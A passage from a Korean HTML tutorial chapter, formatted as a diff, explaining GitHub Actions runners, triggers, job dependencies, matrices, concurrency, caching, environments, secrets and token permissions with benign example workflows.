@@ -1,0 +1,738 @@
+<h1>GitHub Actions 깊이 알기</h1>
+<p class="lede">PART 2에서는 "이슈가 열리면 GitHub 클라우드의 실제 Windows 서버(VM)에서 엑셀을 변환한다"는 워크플로우 하나를 만들었습니다. 이 장에서는 그 YAML 한 줄 한 줄 뒤에서 무슨 일이 일어나는지, 실무에서 CI/CD를 설계·운영할 때 알아야 할 문법·보안·비용·디버깅을 전문가 수준으로 정리합니다.</p>
+
+<div class="callout callout-tip">
+  <span class="callout-title">(참고) 실습에 꼭 필요하지는 않지만…</span>
+  PART 3은 선택 학습 자료입니다. 실습을 마치는 데는 필요 없지만, 직접 워크플로우를 설계하거나 팀의 CI를 맡게 되면 여기 나오는 내용 대부분을 마주치게 됩니다. 필요한 절만 골라 읽어도 됩니다.
+  숫자(요금·한도·runner 사양)는 <b>작성 시점(2026년 11월) 기준</b>이며 자주 바뀌니, 각 절의 공식 문서 링크로 최신 값을 확인하세요.
+</div>
+
+<h2>1. 아키텍처: 이벤트에서 Step까지</h2>
+<p>GitHub Actions는 "저장소에서 일어난 <b>이벤트</b>를 받아, <b>워크플로우</b> 파일을 해석하고, <b>Job</b>마다 <b>runner</b>를 배정해, 그 안에서 <b>Step</b>을 순서대로 실행하는" 시스템입니다.</p>
+<figure class="diagram">
+  <svg viewBox="0 0 720 250" role="img" aria-label="이벤트가 워크플로우를 깨우고, Job마다 별도 runner VM에서 Step이 실행되는 구조">
+    <defs>
+      <marker id="xa-arr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0 0 L10 5 L0 10z" fill="var(--ink)" /></marker>
+    </defs>
+    <rect x="10" y="95" width="110" height="60" rx="12" fill="var(--bg-elev)" stroke="var(--c-work)" stroke-width="2" />
+    <text x="65" y="120" text-anchor="middle" font-weight="800" fill="var(--ink)">Event</text>
+    <text x="65" y="140" text-anchor="middle" font-size="12" fill="var(--ink)">push · issues · cron</text>
+    <path d="M120 125 H158" stroke="var(--ink)" stroke-width="2" marker-end="url(#xa-arr)" />
+    <rect x="160" y="80" width="130" height="90" rx="12" fill="var(--bg-elev)" stroke="var(--c-repo)" stroke-width="2" />
+    <text x="225" y="112" text-anchor="middle" font-weight="800" fill="var(--ink)">Workflow</text>
+    <text x="225" y="132" text-anchor="middle" font-size="12" fill="var(--ink)">.github/workflows/</text>
+    <text x="225" y="150" text-anchor="middle" font-size="12" fill="var(--ink)">*.yml</text>
+    <path d="M290 110 L348 62" stroke="var(--ink)" stroke-width="2" marker-end="url(#xa-arr)" />
+    <path d="M290 140 L348 188" stroke="var(--ink)" stroke-width="2" marker-end="url(#xa-arr)" />
+    <rect x="350" y="20" width="160" height="84" rx="12" fill="var(--bg-elev)" stroke="var(--c-stage)" stroke-width="2" />
+    <text x="430" y="44" text-anchor="middle" font-weight="800" font-size="15" fill="var(--ink)">Job A · 새 VM #1</text>
+    <text x="430" y="66" text-anchor="middle" font-size="12" fill="var(--ink)">step 1 → step 2 → step 3</text>
+    <text x="430" y="86" text-anchor="middle" font-size="12" fill="var(--ink)">같은 파일시스템 공유</text>
+    <rect x="350" y="146" width="160" height="84" rx="12" fill="var(--bg-elev)" stroke="var(--c-stage)" stroke-width="2" />
+    <text x="430" y="170" text-anchor="middle" font-weight="800" font-size="15" fill="var(--ink)">Job B · 새 VM #2</text>
+    <text x="430" y="192" text-anchor="middle" font-size="12" fill="var(--ink)">A와 병렬 실행</text>
+    <text x="430" y="212" text-anchor="middle" font-size="12" fill="var(--ink)">A의 파일은 안 보임</text>
+    <path d="M510 62 L568 112" stroke="var(--ink)" stroke-width="2" marker-end="url(#xa-arr)" />
+    <path d="M510 188 L568 138" stroke="var(--ink)" stroke-width="2" marker-end="url(#xa-arr)" />
+    <rect x="570" y="90" width="140" height="70" rx="12" fill="var(--bg-elev)" stroke="var(--c-remote)" stroke-width="2" />
+    <text x="640" y="116" text-anchor="middle" font-weight="800" fill="var(--ink)">Job C</text>
+    <text x="640" y="138" text-anchor="middle" font-size="12" fill="var(--ink)">needs: [A, B]</text>
+    <line x1="350" y1="125" x2="510" y2="125" stroke="var(--line)" stroke-dasharray="4 4" />
+    <text x="430" y="130" text-anchor="middle" font-size="11" fill="var(--ink)">데이터는 artifact/outputs로만 전달</text>
+  </svg>
+</figure>
+
+<h3>Runner의 일생 (GitHub-hosted)</h3>
+<ol class="steps">
+  <li><strong>Job 대기열 등록</strong> — 이벤트가 오면 워크플로우가 해석되고, 각 Job이 <code>runs-on</code> label에 맞는 runner를 기다립니다.</li>
+  <li><strong>새 VM 할당</strong> — 표준 GitHub-hosted runner는 <b>Job마다 깨끗한 새 VM(클라우드의 실제 서버 한 대)</b>을 받습니다. 이전 Job의 파일·설치 도구·캐시 디렉터리는 하나도 남아 있지 않아요. (예외: 1 vCPU <code>ubuntu-slim</code>은 공유 VM 위 컨테이너)</li>
+  <li><strong>Step 실행</strong> — 같은 Job 안의 Step은 같은 작업 디렉터리(<code>$GITHUB_WORKSPACE</code>)를 공유합니다. Linux·macOS는 비밀번호 없는 <code>sudo</code>, Windows는 관리자 권한(UAC 꺼짐)입니다.</li>
+  <li><strong>정리·폐기</strong> — Job이 끝나면 VM은 폐기되고, Job 전용 <code>GITHUB_TOKEN</code>도 만료됩니다. 남기고 싶은 결과는 <b>artifact·cache·커밋</b>으로 밖에 내보내야 합니다.</li>
+</ol>
+<div class="callout">
+  <span class="callout-title">PART 2와 연결</span>
+  Excel 변환 워크플로우가 매번 <code>pip install</code>부터 다시 하는 이유가 바로 "Job마다 새 VM"이기 때문입니다. <code>setup-python</code>의 <code>cache: pip</code>는 다운로드한 패키지를 GitHub 캐시 저장소에 보관했다가 새 VM에 다시 풀어 주는 장치예요.
+</div>
+
+<h3>Runner 종류와 이미지</h3>
+<p>표준 runner 사양은 저장소 공개 범위에 따라 다릅니다(작성 시점 기준, <a href="https://docs.github.com/en/actions/reference/runners/github-hosted-runners" target="_blank" rel="noopener">공식 표</a>).</p>
+<table>
+  <thead><tr><th>OS / 아키텍처</th><th>대표 label</th><th>Public 저장소</th><th>Private 저장소</th></tr></thead>
+  <tbody>
+    <tr><td>Linux x64</td><td><code>ubuntu-latest</code>, <code>ubuntu-24.04</code></td><td>4 vCPU / 16 GB</td><td>2 vCPU / 8 GB</td></tr>
+    <tr><td>Linux arm64</td><td><code>ubuntu-24.04-arm</code></td><td>4 vCPU / 16 GB</td><td>2 vCPU / 8 GB</td></tr>
+    <tr><td>Windows x64</td><td><code>windows-latest</code>, <code>windows-2025</code></td><td>4 vCPU / 16 GB</td><td>2 vCPU / 8 GB</td></tr>
+    <tr><td>Windows arm64</td><td><code>windows-11-arm</code></td><td>4 vCPU / 16 GB</td><td>2 vCPU / 8 GB</td></tr>
+    <tr><td>macOS arm64 (M1)</td><td><code>macos-latest</code>, <code>macos-15</code></td><td>3 vCPU / 7 GB</td><td>3 vCPU / 7 GB</td></tr>
+    <tr><td>Linux 1 vCPU</td><td><code>ubuntu-slim</code></td><td colspan="2">1 vCPU / 5 GB, 컨테이너 기반 (Docker-in-Docker 불가)</td></tr>
+  </tbody>
+</table>
+<ul>
+  <li><b><code>-latest</code>는 움직이는 표적</b>입니다. 작성 시점에 <code>ubuntu-latest</code>=24.04, <code>windows-latest</code>=Windows Server 2025를 가리키지만 주기적으로 바뀝니다. 재현성이 중요하면 <code>ubuntu-24.04</code>처럼 버전을 고정하세요.</li>
+  <li><b>사전 설치 소프트웨어</b>는 <a href="https://github.com/actions/runner-images" target="_blank" rel="noopener">actions/runner-images</a> 저장소의 이미지별 README에 목록이 있습니다. Python·Node·Java·Docker·각종 CLI(<code>gh</code> 포함)는 대부분 있지만 <b>Microsoft Office(Excel)는 없습니다</b>. PART 2에서 xlwings가 openpyxl로 대체된 이유입니다.</li>
+  <li><b>Larger runners</b>: 유료 플랜(Team·Enterprise)에서 더 많은 코어·메모리·GPU·고정 IP를 가진 runner를 만들 수 있습니다. public 저장소에서도 과금됩니다.</li>
+</ul>
+
+<h3>OS별 차이 요약</h3>
+<table>
+  <thead><tr><th></th><th>Linux</th><th>Windows</th><th>macOS</th></tr></thead>
+  <tbody>
+    <tr><td>기본 셸</td><td><code>bash -e</code></td><td><code>pwsh</code> (PowerShell 7)</td><td><code>bash -e</code></td></tr>
+    <tr><td>준비 시간</td><td>가장 빠름</td><td>느린 편 (이미지가 큼)</td><td>느린 편, 동시 실행 한도 별도</td></tr>
+    <tr><td>컨테이너 Job (<code>container:</code>, service containers)</td><td>지원</td><td>미지원</td><td>미지원</td></tr>
+    <tr><td>경로·줄바꿈</td><td><code>/</code>, LF</td><td><code>\</code>, CRLF (<code>core.autocrlf</code> 주의)</td><td><code>/</code>, LF, 대소문자 비구분 파일시스템</td></tr>
+    <tr><td>분당 단가 (private)</td><td>가장 저렴</td><td>Linux보다 비쌈</td><td>훨씬 비쌈</td></tr>
+  </tbody>
+</table>
+
+<h2>2. 트리거(<code>on:</code>) 완전 정복</h2>
+<h3>필터와 activity types</h3>
+<pre data-lang="yaml">on:
+  push:
+    branches: [main, "release/**"]     # glob 지원
+    tags: ["v*.*.*"]
+    paths:                              # 이 경로가 바뀐 경우에만
+      - "src/**"
+      - "!src/**/*.md"                  # ! 로 제외 (순서 중요: 뒤에 오는 패턴이 이김)
+  pull_request:
+    types: [opened, synchronize, reopened, ready_for_review]
+    branches: [main]                    # PR의 "대상(base)" 브랜치 기준
+  issues:
+    types: [opened, labeled]</pre>
+<ul>
+  <li><code>branches</code>와 <code>branches-ignore</code>, <code>paths</code>와 <code>paths-ignore</code>는 각각 같은 이벤트에서 함께 쓸 수 없습니다(부정 패턴 <code>!</code>을 쓰세요).</li>
+  <li><code>types</code>를 생략하면 이벤트마다 정해진 기본 type만 반응합니다. 예: <code>pull_request</code>는 <code>opened</code>, <code>synchronize</code>, <code>reopened</code>.</li>
+  <li><code>paths</code> 필터로 건너뛴 워크플로우는 "실행되지 않음"이라 <b>필수 상태 검사(required check)가 영원히 대기</b>할 수 있습니다. 필수 검사로 지정할 Job이라면 Job 단위 <code>if</code>로 건너뛰는 방식을 고려하세요.</li>
+</ul>
+
+<h3>수동 실행: <code>workflow_dispatch</code></h3>
+<pre data-lang="yaml">on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: "배포 대상"
+        type: choice
+        options: [staging, production]
+        default: staging
+      dry_run:
+        type: boolean
+        default: true
+      env_name:
+        type: environment              # 저장소의 environment 목록에서 선택</pre>
+<p>입력 타입은 <code>string</code>·<code>boolean</code>·<code>choice</code>·<code>number</code>·<code>environment</code> 다섯 가지이고, 최상위 입력은 최대 25개입니다. 값은 <code>${{ inputs.target }}</code>으로 읽습니다. CLI에서는 <code>gh workflow run deploy.yml -f target=production -f dry_run=false</code>.</p>
+
+<h3>예약 실행: <code>schedule</code></h3>
+<pre data-lang="yaml">on:
+  schedule:
+    - cron: "0 0 * * 1-5"              # timezone 이 없으면 UTC 기준 → 한국 시간 09:00
+    - cron: "30 8 * * 1"
+      timezone: "Asia/Seoul"            # IANA 타임존 지정 (최근 추가된 옵션)</pre>
+<ul>
+  <li>cron은 기본적으로 <b>UTC</b>입니다. 한국(KST=UTC+9) 기준으로 쓰다 하루가 밀리는 실수가 흔해요. 최근 문서에는 <code>timezone</code> 키가 추가되었으니 사용 가능 여부를 <a href="https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#schedule" target="_blank" rel="noopener">공식 문서</a>에서 확인하세요.</li>
+  <li>최소 간격은 5분이며, <b>기본 브랜치의 최신 커밋</b>에서만 실행됩니다.</li>
+  <li>정각(<code>0 * * * *</code>)은 전 세계 사용자가 몰려 수 분~수십 분 지연되거나 드물게 누락될 수 있습니다. 정확한 시각이 중요하면 <code>17 * * * *</code>처럼 어긋난 분을 쓰세요.</li>
+  <li>공개 저장소에서 오랫동안(60일) 활동이 없으면 예약 워크플로우가 자동 비활성화될 수 있습니다.</li>
+</ul>
+
+<h3>워크플로우끼리 연결하기</h3>
+<table>
+  <thead><tr><th>트리거</th><th>언제 쓰나</th><th>주의</th></tr></thead>
+  <tbody>
+    <tr><td><code>workflow_call</code></td><td>다른 워크플로우가 이 워크플로우를 <b>함수처럼 호출</b> (재사용 워크플로우)</td><td>입력·secret·output을 명시적으로 선언</td></tr>
+    <tr><td><code>workflow_run</code></td><td>"워크플로우 X가 끝나면" 실행</td><td>기본 브랜치의 정의로, <b>쓰기 권한·secret을 가진 채</b> 실행됨 → fork PR 결과물을 다룰 때 위험</td></tr>
+    <tr><td><code>repository_dispatch</code></td><td>외부 시스템이 API로 깨움 (<code>event_type</code> + <code>client_payload</code>)</td><td>호출 측 토큰 필요, payload는 신뢰할 수 없는 입력으로 취급</td></tr>
+  </tbody>
+</table>
+<pre data-lang="bash"># 외부에서 repository_dispatch 보내기 (토큰은 환경 변수로)
+gh api repos/you/excel-dashboard/dispatches \
+  -f event_type=excel-uploaded \
+  -F client_payload[file]=sales.xlsx</pre>
+
+<div class="callout callout-warn">
+  <span class="callout-title">GITHUB_TOKEN이 만든 이벤트는 워크플로우를 깨우지 않는다</span>
+  무한 루프를 막기 위해, <code>GITHUB_TOKEN</code>으로 push·이슈 생성 등을 해도 새 워크플로우 실행이 <b>생기지 않습니다</b>(예외: <code>workflow_dispatch</code>, <code>repository_dispatch</code>). PART 2에서 봇이 docs 브랜치에 push해도 다른 워크플로우가 연쇄 실행되지 않은 이유입니다. 연쇄가 꼭 필요하면 GitHub App 토큰을 쓰거나 <code>workflow_dispatch</code>를 명시적으로 호출하세요.
+</div>
+
+<h2>3. Job 설계: 의존성·조건·병렬</h2>
+<h3>needs, if, outputs</h3>
+<pre data-lang="yaml">jobs:
+  detect:
+    runs-on: ubuntu-latest
+    outputs:
+      changed: ${{ steps.diff.outputs.changed }}     # step output → job output
+    steps:
+      - uses: actions/checkout@v4
+        with: { fetch-depth: 2 }
+      - id: diff
+        run: |
+          if git diff --quiet HEAD~1 -- data/; then
+            echo "changed=false" &gt;&gt; "$GITHUB_OUTPUT"
+          else
+            echo "changed=true" &gt;&gt; "$GITHUB_OUTPUT"
+          fi
+
+  convert:
+    needs: detect                                     # detect 성공 후에만
+    if: needs.detect.outputs.changed == 'true'        # 출력은 항상 "문자열"
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "변환 시작"
+
+  notify:
+    needs: [detect, convert]
+    if: ${{ !cancelled() }}                           # 앞 Job이 실패/건너뜀이어도 실행
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "convert 결과 = ${{ needs.convert.result }}"</pre>
+<ul>
+  <li><code>needs</code>가 없으면 Job은 <b>모두 병렬</b>로 시작합니다.</li>
+  <li><code>needs</code>된 Job이 실패·건너뜀이면 뒤 Job은 기본적으로 건너뜁니다. 그래도 실행하려면 상태 함수(<code>always()</code>, <code>failure()</code>, <code>!cancelled()</code>)를 <code>if</code>에 넣어야 합니다. 사용자가 취소해도 돌아가는 <code>always()</code>보다 <code>!cancelled()</code>가 대체로 안전합니다.</li>
+  <li>Job output은 문자열입니다. <code>'true'</code>처럼 따옴표로 비교하세요. 큰 데이터는 output이 아니라 artifact로 넘깁니다.</li>
+</ul>
+
+<h3>strategy.matrix</h3>
+<pre data-lang="yaml">jobs:
+  test:
+    runs-on: ${{ matrix.os }}
+    strategy:
+      fail-fast: false          # 하나가 실패해도 나머지 계속 (기본값 true)
+      max-parallel: 4           # 동시에 최대 4개
+      matrix:
+        os: [ubuntu-latest, windows-latest]
+        python: ["3.11", "3.12", "3.13"]
+        exclude:
+          - os: windows-latest
+            python: "3.11"      # 이 조합은 빼기
+        include:
+          - os: ubuntu-latest
+            python: "3.13"
+            coverage: true      # 기존 조합에 변수 추가
+          - os: macos-latest
+            python: "3.12"      # 새 조합 추가
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with: { python-version: "${{ matrix.python }}" }
+      - if: matrix.coverage
+        run: echo "커버리지 측정"</pre>
+<p>matrix는 한 워크플로우 실행당 최대 256개 Job까지 만들 수 있습니다. <code>fromJSON()</code>으로 앞 Job이 계산한 목록을 matrix로 넘기는 <b>동적 matrix</b>도 가능합니다.</p>
+<pre data-lang="yaml">jobs:
+  list:
+    runs-on: ubuntu-latest
+    outputs:
+      files: ${{ steps.ls.outputs.files }}
+    steps:
+      - uses: actions/checkout@v4
+      - id: ls
+        run: echo "files=$(ls data/*.xlsx | jq -R . | jq -cs .)" &gt;&gt; "$GITHUB_OUTPUT"
+  convert:
+    needs: list
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        file: ${{ fromJSON(needs.list.outputs.files) }}
+    steps:
+      - run: echo "변환: ${{ matrix.file }}"</pre>
+
+<h3>concurrency: 겹치는 실행 제어</h3>
+<pre data-lang="yaml"># PR마다 최신 커밋만 검사 (이전 실행은 취소)
+concurrency:
+  group: ci-${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
+  cancel-in-progress: true</pre>
+<table>
+  <thead><tr><th>설정</th><th>동작</th><th>어울리는 곳</th></tr></thead>
+  <tbody>
+    <tr><td><code>cancel-in-progress: true</code></td><td>새 실행이 오면 진행 중인 실행 취소</td><td>PR 테스트 (최신 커밋만 의미 있음)</td></tr>
+    <tr><td><code>cancel-in-progress: false</code> (기본)</td><td>진행 중 실행은 끝까지. 대기는 <b>1개만</b>, 더 오면 이전 대기분이 취소됨</td><td>배포 (중간에 끊기면 안 됨)</td></tr>
+    <tr><td><code>queue: max</code> (최근 추가)</td><td>최대 100개까지 순서대로 대기. <code>cancel-in-progress: true</code>와 함께 쓸 수 없음</td><td>모든 요청을 빠짐없이 처리해야 할 때</td></tr>
+  </tbody>
+</table>
+<div class="callout callout-warn">
+  <span class="callout-title">PART 2 워크플로우의 숨은 함정</span>
+  Excel 변환과 화면 배포는 같은 <code>group: dashboard-data</code>를 씁니다. 기본 동작에서는 대기 슬롯이 1개라, 이슈 3개가 연달아 올라오면 <b>가운데 이슈의 실행은 취소</b>될 수 있어요. 모든 업로드를 처리해야 한다면 <code>queue: max</code>를 고려하세요.
+</div>
+
+<h3>기타 Job 옵션</h3>
+<table>
+  <thead><tr><th>키</th><th>의미</th><th>팁</th></tr></thead>
+  <tbody>
+    <tr><td><code>timeout-minutes</code></td><td>Job(또는 Step) 최대 시간. 기본 360분</td><td>항상 짧게 설정. 멈춘 Job이 6시간 동안 분을 태우는 사고 방지</td></tr>
+    <tr><td><code>continue-on-error</code></td><td>실패해도 워크플로우를 실패로 만들지 않음</td><td>실험적 matrix 조합(<code>nightly</code> 버전 등)에만</td></tr>
+    <tr><td><code>environment</code></td><td>배포 환경 지정 → 보호 규칙·환경 secret 적용</td><td>5절 참고</td></tr>
+    <tr><td><code>container</code> / <code>services</code></td><td>Job을 컨테이너 안에서 실행 / DB 같은 사이드카</td><td>Linux runner에서만</td></tr>
+    <tr><td><code>defaults.run</code></td><td>모든 <code>run</code> step의 기본 <code>shell</code>·<code>working-directory</code></td><td>Windows에서 bash로 통일할 때 유용</td></tr>
+  </tbody>
+</table>
+
+<h2>4. Step, 표현식, 실행 환경 다루기</h2>
+<h3>uses vs run, shell, working-directory</h3>
+<pre data-lang="yaml">defaults:
+  run:
+    shell: bash                  # Windows에서도 Git Bash 사용
+    working-directory: scripts
+
+steps:
+  - uses: actions/checkout@v4    # 남이 만든 action (with: 로 입력)
+  - name: PowerShell이 필요한 단계
+    shell: pwsh
+    run: Get-ChildItem
+  - name: 다른 폴더에서 실행
+    working-directory: dashboard
+    run: ls</pre>
+<p><code>shell: bash</code>를 명시하면 <code>bash --noprofile --norc -eo pipefail {0}</code>으로 실행되어 <b>파이프 중간의 실패도 잡힙니다</b>. 생략하면 <code>bash -e</code>라 <code>cmd | tee log</code>에서 <code>cmd</code>가 실패해도 통과할 수 있어요.</p>
+
+<h3>환경 변수 우선순위</h3>
+<p>같은 이름이면 <b>step <code>env</code> &gt; job <code>env</code> &gt; workflow <code>env</code></b> 순으로 가까운 쪽이 이깁니다. 기본 제공 변수(<code>GITHUB_SHA</code>, <code>RUNNER_OS</code> 등)는 덮어쓰지 마세요.</p>
+
+<h3>Context와 표현식</h3>
+<p><code>${{ }}</code> 안에서는 context(데이터)와 함수를 쓸 수 있습니다. 이 치환은 <b>셸이 실행되기 전에, 문자열로</b> 일어난다는 점이 보안의 핵심입니다(8절).</p>
+<section class="theory">
+  <dl class="theory-terms">
+    <div><dt><code>github</code></dt><dd>이벤트 payload(<code>github.event.*</code>), <code>github.ref</code>, <code>github.sha</code>, <code>github.actor</code>, <code>github.repository</code> 등</dd></div>
+    <div><dt><code>env</code> / <code>vars</code> / <code>secrets</code></dt><dd>환경 변수 / 설정 변수(Variables) / 비밀 값</dd></div>
+    <div><dt><code>steps</code> / <code>needs</code> / <code>jobs</code></dt><dd>이전 step의 output·결과 / 의존 Job의 output·결과 / 재사용 워크플로우의 Job 결과</dd></div>
+    <div><dt><code>matrix</code> / <code>strategy</code></dt><dd>현재 matrix 조합 값 / <code>fail-fast</code>, <code>job-index</code> 등</dd></div>
+    <div><dt><code>runner</code></dt><dd><code>runner.os</code>, <code>runner.arch</code>, <code>runner.temp</code></dd></div>
+    <div><dt><code>inputs</code></dt><dd><code>workflow_dispatch</code>·<code>workflow_call</code> 입력</dd></div>
+  </dl>
+</section>
+<table>
+  <thead><tr><th>함수</th><th>예시</th></tr></thead>
+  <tbody>
+    <tr><td><code>contains</code>, <code>startsWith</code>, <code>endsWith</code></td><td><code>startsWith(github.ref, 'refs/tags/v')</code></td></tr>
+    <tr><td><code>format</code>, <code>join</code></td><td><code>format('{0}-{1}', runner.os, matrix.python)</code></td></tr>
+    <tr><td><code>toJSON</code>, <code>fromJSON</code></td><td>디버깅 출력, 문자열→배열/불리언 변환</td></tr>
+    <tr><td><code>hashFiles</code></td><td><code>hashFiles('**/requirements.txt')</code> — 캐시 키</td></tr>
+    <tr><td>상태 함수</td><td><code>success()</code>(기본), <code>failure()</code>, <code>cancelled()</code>, <code>always()</code></td></tr>
+  </tbody>
+</table>
+<p>PART 2의 <code>contains(fromJSON('["OWNER","MEMBER","COLLABORATOR"]'), github.event.issue.author_association)</code>은 "배열 리터럴을 만들고 포함 여부를 검사"하는 전형적인 패턴입니다.</p>
+
+<h3>파일 기반 명령: GITHUB_ENV · GITHUB_OUTPUT · GITHUB_STEP_SUMMARY</h3>
+<pre data-lang="bash"># 다음 step부터 쓸 환경 변수
+echo "BUILD_DATE=$(date -u +%F)" &gt;&gt; "$GITHUB_ENV"
+
+# step output (id 가 있어야 steps.&lt;id&gt;.outputs.&lt;name&gt; 으로 읽음)
+echo "row_count=1234" &gt;&gt; "$GITHUB_OUTPUT"
+
+# 여러 줄 값은 구분자(heredoc) 방식
+{
+  echo "report&lt;&lt;EOF"
+  cat report.txt
+  echo "EOF"
+} &gt;&gt; "$GITHUB_OUTPUT"
+
+# 실행 요약 페이지에 Markdown 출력
+echo "### 변환 결과: 시트 3개, 1,234행 ✅" &gt;&gt; "$GITHUB_STEP_SUMMARY"
+
+# 다음 step부터 PATH 추가
+echo "$HOME/.local/bin" &gt;&gt; "$GITHUB_PATH"</pre>
+<p>예전 <code>::set-output</code>·<code>::set-env</code> 명령은 폐기되었습니다. 오래된 예제를 복사할 때 주의하세요. Windows PowerShell에서는 <code>"name=value" | Out-File -FilePath $env:GITHUB_OUTPUT -Append</code> 형태로 씁니다.</p>
+
+<h3>Workflow commands (로그 주석)</h3>
+<pre data-lang="bash">echo "::notice title=변환::시트 3개를 처리했습니다"
+echo "::warning file=scripts/excel_to_json.py,line=42::빈 시트를 건너뜀"
+echo "::error::첨부 파일을 찾을 수 없습니다"
+echo "::group::설치 로그"; pip install -r requirements.txt; echo "::endgroup::"
+echo "::add-mask::$DERIVED_TOKEN"   # 런타임에 만든 비밀 값을 로그에서 가리기</pre>
+<p><code>::error</code>·<code>::warning</code>은 실행 요약과 PR의 Files 탭에 주석으로 표시됩니다. PART 2의 AI 리뷰 워크플로우가 Secret이 없을 때 <code>::warning::</code>을 남긴 것도 이 기능입니다.</p>
+
+<h2>5. 데이터 나르기: Cache · Artifact · Environment</h2>
+<h3>Cache vs Artifact</h3>
+<table>
+  <thead><tr><th></th><th>Cache</th><th>Artifact</th></tr></thead>
+  <tbody>
+    <tr><td>목적</td><td>다음 실행을 <b>빠르게</b> (의존성, 빌드 캐시)</td><td>결과물을 <b>보관·전달</b> (빌드 산출물, 리포트, Job 간 파일)</td></tr>
+    <tr><td>범위</td><td>키 기반, 브랜치 범위 규칙 (기본 브랜치 캐시는 다른 브랜치에서 읽기 가능)</td><td>같은 워크플로우 실행 안 Job 간 / 실행 페이지에서 다운로드</td></tr>
+    <tr><td>보존</td><td>저장소당 10 GB, 7일간 안 쓰면 삭제, 오래된 것부터 제거</td><td>기본 90일 (설정·<code>retention-days</code>로 조정), 플랜별 저장 용량에 포함</td></tr>
+    <tr><td>보안</td><td>PR에서 만든 캐시는 기본 브랜치에서 안 읽힘 (캐시 오염 방지)</td><td>누구나(읽기 권한자) 다운로드 가능 → 비밀 넣지 말 것</td></tr>
+  </tbody>
+</table>
+<pre data-lang="yaml">steps:
+  # 1) setup-* 내장 캐시: 가장 간단
+  - uses: actions/setup-python@v5
+    with:
+      python-version: "3.12"
+      cache: pip
+      cache-dependency-path: scripts/requirements.txt
+
+  # 2) 직접 캐시: 원하는 경로·키
+  - uses: actions/cache@v4
+    with:
+      path: ~/.cache/my-tool
+      key: tool-${{ runner.os }}-${{ hashFiles('**/lockfile') }}
+      restore-keys: |
+        tool-${{ runner.os }}-
+
+  # 3) 산출물 업로드 (짧게 보관)
+  - uses: actions/upload-artifact@v4
+    with:
+      name: data-json
+      path: build/data.json
+      retention-days: 3
+      if-no-files-found: error</pre>
+<div class="callout callout-tip">
+  <span class="callout-title">캐시 키 설계</span>
+  <code>key</code>는 정확히 일치해야 hit, 아니면 <code>restore-keys</code>의 접두사로 가장 최근 캐시를 부분 복원합니다. <b>lockfile 해시를 키에 넣는 것</b>이 정석입니다. 캐시는 덮어쓰지 않으므로(같은 키는 불변) 내용이 바뀌면 키가 바뀌어야 해요.
+</div>
+
+<h3>Environments: 승인과 보호 규칙</h3>
+<pre data-lang="yaml">jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    environment:
+      name: production
+      url: https://dashboard.example.com
+    steps:
+      - run: ./deploy.sh
+        env:
+          API_KEY: ${{ secrets.PROD_API_KEY }}   # production 환경에만 있는 secret</pre>
+<ul>
+  <li><b>Required reviewers</b>(최대 6명/팀): 지정된 사람이 승인해야 Job이 시작됩니다.</li>
+  <li><b>Wait timer</b>(최대 30일), <b>Deployment branches/tags</b>(예: <code>main</code>과 <code>v*</code> 태그만 배포 가능), GitHub App 기반 custom rule.</li>
+  <li>환경 secret은 보호 규칙을 <b>통과한 Job에만</b> 전달됩니다. "PR 브랜치에서 prod 키를 쓸 수 없게" 만드는 가장 확실한 방법이에요.</li>
+  <li>플랜 제약(작성 시점): Free·Pro·Team에서는 required reviewers·wait timer가 <b>public 저장소</b>에서만 동작합니다. <a href="https://docs.github.com/en/actions/reference/workflows-and-actions/deployments-and-environments" target="_blank" rel="noopener">공식 문서</a> 확인.</li>
+</ul>
+
+<h2>6. Secrets · Variables · GITHUB_TOKEN · OIDC</h2>
+<h3>Secrets와 Variables</h3>
+<table>
+  <thead><tr><th>수준</th><th>Secrets</th><th>Variables (<code>vars.*</code>)</th></tr></thead>
+  <tbody>
+    <tr><td>Organization</td><td>여러 저장소 공유, 접근 저장소 지정</td><td>공통 설정값</td></tr>
+    <tr><td>Repository</td><td>저장소 전체</td><td>저장소 설정값</td></tr>
+    <tr><td>Environment</td><td>보호 규칙 통과 시에만</td><td>환경별 URL·리전 등</td></tr>
+  </tbody>
+</table>
+<ul>
+  <li>같은 이름이면 <b>Environment &gt; Repository &gt; Organization</b> 순으로 우선합니다.</li>
+  <li>Secret 값은 로그에서 <code>***</code>로 가려지지만 <b>완벽하지 않습니다</b>. base64 인코딩, 한 글자씩 출력, JSON 일부 등 변형된 값은 가려지지 않아요. 비밀 값을 가공했다면 <code>::add-mask::</code>로 등록하세요.</li>
+  <li>Secret은 <code>if:</code> 조건에서 직접 쓸 수 없습니다. <code>env</code>로 옮긴 뒤 <code>env.X != ''</code>로 확인하는 패턴을 씁니다.</li>
+  <li>fork에서 온 PR(<code>pull_request</code>)에는 secret이 전달되지 않습니다(<code>GITHUB_TOKEN</code>은 읽기 전용으로만). PART 2 AI 리뷰가 같은 저장소 PR만 대상으로 한 이유입니다.</li>
+</ul>
+<pre data-lang="bash"># CLI로 secret/variable 설정 (값은 프롬프트 또는 파일/표준입력으로)
+gh secret set ANTHROPIC_API_KEY            # 대화형 입력, 셸 히스토리에 남지 않음
+gh secret set PROD_API_KEY --env production &lt; key.txt
+gh variable set DASHBOARD_TITLE --body "매출 대시보드"</pre>
+
+<h3>GITHUB_TOKEN과 <code>permissions:</code></h3>
+<p><code>GITHUB_TOKEN</code>은 Job마다 발급되는 GitHub App 설치 토큰으로, <b>해당 저장소에만</b> 유효하고 Job이 끝나면 만료됩니다(GitHub-hosted에서는 Job 최대 시간인 6시간이 사실상 상한). 기본 권한은 저장소·조직 설정(<b>Settings → Actions → General → Workflow permissions</b>)에 따르며, 2023년 이후 생성된 저장소·조직은 대체로 읽기 전용(restricted)이 기본입니다.</p>
+<pre data-lang="yaml">permissions: {}                 # 워크플로우 기본: 아무 권한 없음
+
+jobs:
+  test:
+    permissions:
+      contents: read            # Job별로 필요한 것만
+    runs-on: ubuntu-latest
+    steps: [...]
+  release:
+    permissions:
+      contents: write           # 태그/릴리스 생성
+      id-token: write           # OIDC 토큰 요청
+    runs-on: ubuntu-latest
+    steps: [...]</pre>
